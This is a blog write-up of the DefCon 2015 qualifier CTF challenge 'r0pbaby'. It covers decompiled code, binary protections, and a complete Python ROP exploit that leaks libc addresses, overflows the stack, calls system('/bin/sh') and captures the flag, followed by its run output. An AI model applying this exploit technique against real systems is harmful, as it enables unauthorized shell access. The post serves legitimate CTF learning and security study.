---
layout: post
title: "DefConCTF 2015 Quals - ROPBaby Writeup"
date: 2015-05-18 21:16:42 +0430
comments: true
categories: pwn defconctf rop
---

**DefConCTF 2015 ROPBaby Writeup**  
**Point = 1**  
**Category = Pwnable**  

As the challenge name proved we should use ROP technique to read flag from the server ( or pop a shell ).

> r0pbaby_542ee6516410709a1421141501f03760

```
./r0pbaby_542ee6516410709a1421141501f03760 

<!--more-->

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007FF0352429B0
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007FF034A9DC40
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 

```

So we have address of any symbols of the `libc.so.6`.

Let's check the binary in IDA, the main function is `sub_C46`.

```
__int64 sub_C46()
{
  __int64 v0; // rax@2
  signed int v1; // eax@4
  __int64 v2; // rax@12
  unsigned __int64 v3; // r14@15
  int v4; // er13@17
  size_t v5; // r12@17
  int v6; // eax@18
  void *handle; // [sp+8h] [bp-448h]@1
  char nptr[1088]; // [sp+10h] [bp-440h]@2
  __int64 savedregs; // [sp+450h] [bp+0h]@22

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          sub_BF7();
          LODWORD(v0) = sub_B9A(nptr, 1024LL);
          if ( !v0 )
          {
            puts("Bad choice.");
            return 0LL;
          }
          v1 = strtol(nptr, 0LL, 10);
          if ( v1 != 2 )
            break;
          __printf_chk(1LL, "Enter symbol: ");
          LODWORD(v2) = sub_B9A(nptr, 64LL);
          if ( v2 )
          {
            dlsym(handle, nptr);
            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
          }
          else
          {
            puts("Bad symbol.");
          }
        }
        if ( v1 > 2 )
          break;
        if ( v1 != 1 )
          goto LABEL_24;
        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
      }
      if ( v1 != 3 )
        break;
      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
      sub_B9A(nptr, 1024LL);
      v3 = (signed int)strtol(nptr, 0LL, 10);
      if ( v3 - 1 > 0x3FF )
      {
        puts("Invalid amount.");
      }
      else
      {
        if ( v3 )
        {
          v4 = 0;
          v5 = 0LL;
          while ( 1 )
          {
            v6 = _IO_getc(stdin);
            if ( v6 == -1 )
              break;
            nptr[v5] = v6;
            ++v4;
            v5 = v4;
            if ( v3 <= v4 )
              goto LABEL_22;
          }
          v5 = v4 + 1;
        }
        else
        {
          v5 = 0LL;
        }
LABEL_22:
        memcpy(&savedregs, nptr, v5);
      }
    }
    if ( v1 == 4 )
      break;
LABEL_24:
    puts("Bad choice.");
  }
  dlclose(handle);
  puts("Exiting.");
  return 0LL;
}
```

After resolving symbols we can use third menu to overflow and execute our chain.

```
$ file ./r0pbaby_542ee6516410709a1421141501f03760
./r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
$ checksec.sh --file ./r0pbaby_542ee6516410709a1421141501f03760
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./r0pbaby_542ee6516410709a1421141501f03760

```

but there may be a problem since we don't have the `libc.so.6`. but we have, don't we? :)
i used the libc's version of the `babycmd` challenge.

```
./lib/x86_64-linux-gnu/libc.so.6 
GNU C Library (Ubuntu EGLIBC 2.19-0ubuntu6.6) stable release version 2.19, by Roland McGrath et al.
Copyright (C) 2014 Free Software Foundation, Inc.
```

so you can find it here: [http://packages.ubuntu.com/trusty/libc6]

** note: just use LD_LIBRARY_PATH to use this version to implement the attack completely.

Then i found the offset of `/bin/sh` and `pop rdi; ret` from the `system` symbols of the our given `libc.so.6` as you can see below:  
  * /bin/sh offset from system: +0x13669b  
  * pop rdi; ret offset from system: -0x23b26  

you can see my implementation here: 

```
#!/usr/bin/python

import socket
import struct
import telnetlib

def readuntil(f, delim=': '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) > 0
        data += c
    #print data
    return data

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]


#s = socket.create_connection(("127.0.0.1", 1337))
s = socket.create_connection(("r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me", 10436))
f = s.makefile('rw', bufsize=0)

raw_input("$") # attach debugger

print s.recv(1024)
f.write("1\n")
readuntil(f, "0x")
a = f.read(16)
print a
libc = int(a, 16)

f.write("2\nsystem\n")
readuntil(f, "0x")
system = int(f.read(16), 16)
print hex(system)

f.write("3\n32\n"+"A"*8+p(system-0x23b26)+p(system+0x13669b)+p(system)+"\n")

print "[+] shell is ready: "
t = telnetlib.Telnet()
t.sock = s
t.interact()

```

and launching the attack:

```
$ python r0pbaby-expl.py 
$

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 
00007F9F01F43AB0
0x7f9f0179f640
[+] shell is ready: 

1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Enter bytes to send (max 1024): 1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
ls
bin
boot
[..]
cat /home/r0pbaby/flag
The flag is: W3lcome TO THE BIG L3agu3s kiddo, wasn't your first?
```

And another 1 point. Thanks #defconctf

@HAMIDx9
